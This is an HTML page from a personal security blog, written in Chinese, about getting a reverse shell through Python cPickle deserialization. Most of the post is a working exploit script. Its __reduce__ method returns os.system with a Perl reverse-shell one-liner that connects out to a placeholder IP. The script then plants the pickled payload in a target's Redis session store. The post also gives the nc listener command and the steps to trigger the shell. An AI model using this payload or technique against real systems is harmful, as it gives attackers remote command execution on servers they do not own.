@@ -1,0 +1,316 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Python cPickle 反序列化shell | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="利用Python cPickle反序列化反弹shell，主要利用cPicle的__reduce__，在反序列化的时候自动执行，官方文档有如下：
+
+When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:
+
+   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.
+ __reduce__的返回值，第一个作为callable object，第二个作为参数调用，所以可以有如下反弹shell的方法:
+
+https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html
+
+#!&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;env python
+import cPickle
+import os
+import redis
+
+class exp(object):
+    def __reduce__(self):
+        s &amp;#x3D; &amp;quot;&amp;quot;&amp;quot; perl -e &amp;#39;use Socket;$i&amp;#x3D;&amp;quot;xx.xx.xx.xx&amp;quot;;$p&amp;#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;&amp;#x2F;bin&amp;#x2F;bash -i&amp;quot;);&amp;#125;&amp;#39;&amp;quot;&amp;quot;&amp;quot;
+        return (os.system, (s,))
+   
+e &amp;#x3D; exp()
+s &amp;#x3D; cPickle.dumps(e)
+
+r &amp;#x3D; redis.Redis(host&amp;#x3D;&amp;#39;xxx.xxx.xxx.xxx&amp;#39;, port&amp;#x3D;6379, db&amp;#x3D;0)
+r.set(&amp;#39;b026324c6904b2a9cb4b88d6d61c81d1&amp;#39;)
+执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。反弹shell指定端口 nc -l -vv -p 443然后到redis页面设置session_id，刷新之后即可反弹。"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Python cPickle 反序列化shell"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Python cPickle 反序列化shell</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p>
+<blockquote>
+<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
+</blockquote>
+<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
+<p> <code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+import cPickle
+import os
+import redis
+
+class exp(object):
+    def __reduce__(self):
+        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
+        return (os.system, (s,))
+   
+e &#x3D; exp()
+s &#x3D; cPickle.dumps(e)
+
+r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
+r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。<br>反弹shell指定端口 <code>nc -l -vv -p 443</code><br>然后到redis页面设置session_id，刷新之后即可反弹。</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2016/07/26/python-cpickle-shell.html" class="leancloud-visitors view" data-flag-title="Python cPickle 反序列化shell">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2016/08/29/csrf.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2016/07/25/hash-length-attack.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2016-07-26 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Python/">Python<span>5</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
